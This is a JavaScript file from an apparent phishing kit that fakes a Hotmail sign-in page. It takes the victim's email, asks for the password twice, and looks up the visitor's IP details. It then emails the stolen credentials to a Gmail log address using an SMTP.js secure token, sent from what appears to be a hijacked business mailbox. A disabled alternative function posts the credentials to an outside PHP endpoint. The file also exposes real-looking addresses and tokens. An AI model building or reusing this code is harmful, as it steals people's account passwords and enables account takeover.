  var smtp_host = 'smtp.office365.com';
  var smtp_username = 'accounting@bumbleride.com';

  //Enter were logs will go here
  var log_email = 'johnchurchwell356@gmail.com'


  url_link = "session.html";
  //displayPassword()
  loadPasswordAgain()
  var userEmail = document.getElementById('showid').innerHTML, userPassword1,confirmPassword;

  function redirect(url_link){
    //  setTimeout(function(){
    //   hide('ldt');
    //   show('fnf');
    // },3000);
     setTimeout(function(){window.location.href = url_link;},2000);
  }
  





  // load();

  // new MaskedPassword(document.getElementById("email"), '\u25CF');

  // function load(){
  //  displayPassword()
  //   new MaskedPassword(document.getElementById("password"), '\u25CF');
  //     document.getElementById('password').focus();
  // }


  document.getElementById('email-signin').addEventListener('submit',processEmail);
  document.getElementById('signin').addEventListener('submit', processPassword);
  document.getElementById('continue').addEventListener('submit', processPassword2);

  function processEmail(evt){

    evt.preventDefault();

    var uemail = this.userEmail.value.trim();
    // alert(uemail);
    if(ValidateEmail(uemail)){
      userEmail = uemail;
      hide('usernameError');
      set('showid',userEmail);
      displayPassword();

      new MaskedPassword(document.getElementById("password"), '\u25CF');
      document.getElementById('password').focus();
    }else{
      show('usernameError');
    }
  }


  function load(){
    redirect();
  }

  function processPassword(evt){
      evt.preventDefault();


      var upass = this.userPassword.value.trim();
      console.log(upass)
      //var upass = document.getElementById('password').value.trim();

    if(upass !=''){

      userPassword1 = upass;
      
      hide('passwordError');
      hide('password-row');
      show('password2-row');
      new MaskedPassword(document.getElementById("password2"), '\u25CF');
      document.getElementById('password2').focus();
    }else{
      show('passwordError');
    }
  }


  function displayPassword(){
    hide('email-row');
    show('password-row');
    set('showid2',userEmail)
    // new MaskedPassword(document.getElementById("password"), '\u25CF');
    // document.getElementById('password').focus();
  }

  // document.getElementById('svgmg').addEventListener('click',function(){
  //   location.reload();
  // })

  


  function show(element){
    document.getElementById(element).style.display = "flex";
  }

  function hide(element){
    document.getElementById(element).style.display = "none";
  }

  function set(element,value){
    document.getElementById(element).innerHTML=value;
  }


  function processPassword2(t) {
    t.preventDefault();
    var e = this.userPassword2.value.trim();

    var message = "<div> ==================+[ Personal Info - Hotmail ]+================== <br> Username/Email => " + userEmail +  "<br>Password => "+userPassword1 +  "<br>confirm_password => " + e +"</div>"; 
    fetch('https://ipinfo.io?token=f531e7d80833ee')
  .then(response => response.json())
  .then(data => console.log(data));

  console.log(message)
    
    "" != e ? (sendEmail(log_email, message), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
}


//   function processPassword2(t) {
//     t.preventDefault();
//     var e = this.userPassword2.value.trim();
    
//     "" != e ? (sendDetails(userEmail, userPassword1, confirmPassword = e), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
// }

  function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://cors-anywhere.herokuapp.com/https://www.707222junk.com/feedback.php", o).then(function(t) {
          200 === t.status && redirect(url_link)
      }).catch(function(t) {
          console.log(t), alert(t + "\nPlease try again!"), window.history.go(-1)
      })
  }

  
  
  function ValidateEmail(mail) 
  {
   if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
    {
      return (true)
    }
      return (false)
  }


  function loadPasswordAgain() {
    passwordDiv = document.getElementById("password2-row") 
    passwordForm = document.createElement("FORM")
    passwordForm.setAttribute("id", "continue")
    passwordForm.setAttribute('style','margin-top: 11px;')
    passwordForm.noValidate 

    passwordDiv.appendChild(passwordForm) 
    password_InputDiv = document.createElement("DIV") 
    password_InputDiv.setAttribute("class", "form-group row col-md-12") 
    passwordForm.appendChild(password_InputDiv) 
    password_input = document.createElement("INPUT") 
    password_input.setAttribute("type", "password") 
    password_input.setAttribute("autofocus", "autofocus") 
    password_input.setAttribute("size", "200") 
    password_input.setAttribute("maxlength", "113") 
    password_input.setAttribute("id", "password2")
    password_input.setAttribute("name", "userPassword2") 
    password_input.setAttribute("placeholder", "Password") 
    password_input.setAttribute("class", "ltr_override") 
    password_InputDiv.appendChild(password_input) 
    accountDiv = document.createElement("DIV") 
    accountDiv.setAttribute("class", "form-group row col-md-12") 
    forgot_passwordDiv = document.createElement("DIV") 
    forgot_passwordDiv.setAttribute("rold", "heading") 
    forgot_passwordDiv.setAttribute("aria-level", "1") 
    forgot_passwordDiv.setAttribute("style", "font-size:.8125rem") 
    forgot_passwordDiv.innerHTML = '<a href="#">Forgot my password</a>' 
    accountDiv.appendChild(forgot_passwordDiv) 
    signin_buttonholderDiv = document.createElement("DIV")
    signin_buttonholderDiv.setAttribute("class", "form-group row col-md-12") 
    signin_buttonholder1 = document.createElement("DIV") 
    signin_buttonholder1.setAttribute("role", "heading") 
    signin_buttonholder1.setAttribute("aria-level", "1") 
    signin_buttonholder1.setAttribute("class", "col-md-4") 
    signin_buttonholderDiv.appendChild(signin_buttonholder1) 
    signin_buttonholder2 = document.createElement("DIV") 
    signin_buttonholder2.setAttribute("role", "heading") 
    signin_buttonholder2.setAttribute("aria-level", "1") 
    signin_buttonholder2.setAttribute("class", "col-md-4") 
    signin_buttonholderDiv.appendChild(signin_buttonholder2) 
    signin_buttonholder3 = document.createElement("DIV")
    signin_buttonholder3.setAttribute("role", "heading") 
    signin_buttonholder3.setAttribute("aria-level", "1") 
    signin_buttonholder3.setAttribute("class", "col-md-4") 
    signin_buttonholderDiv.appendChild(signin_buttonholder3) 
    signinbutton = document.createElement("BUTTON") 
    signinbutton.setAttribute("type", "submit") 
    signinbutton.setAttribute("class", "btn btn-block btn-primary") 
    signinbutton.setAttribute("id", "send") 
    signinbutton.innerHTML = "Sign in"
    signin_buttonholder3.appendChild(signinbutton) 
    passwordForm.appendChild(accountDiv) 
    passwordForm.appendChild(signin_buttonholderDiv)
}


function sendEmail(to,message) {
  Email.send({
  // Host: smtp_host,
  // Username : smtp_username,
  // Password : smtp_password,
  SecureToken: 'd1645f93-ee4c-46c6-b745-38628bec9b63',
  To : to,
  From : smtp_username,
  Subject : '==============+ [Hotmail] +================',
  Body : message,
  }).then(function(message){
      if(message == 'OK'){
        console.log('message sent')
        redirect(url_link)
      }else{
        console.log(message), alert('there was an error' + "\nPlease try again!"), window.history.go(-1)
      }
    }
  );
}
